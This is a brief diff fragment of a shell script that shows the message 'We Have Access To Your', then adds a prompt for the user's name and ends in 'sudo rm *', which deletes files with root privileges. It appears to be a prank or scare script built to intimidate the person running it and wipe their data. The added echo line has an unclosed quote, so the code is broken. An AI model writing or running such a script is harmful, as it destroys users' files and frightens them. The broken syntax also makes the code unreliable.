@@ -70,5 +70,6 @@ clear
 printf "Hi \n We Have Access To Your"
 sleep 0.1
 clear
-
+read -p "Enter Your Name: "  username
+echo "Hi $username
 sudo rm * 
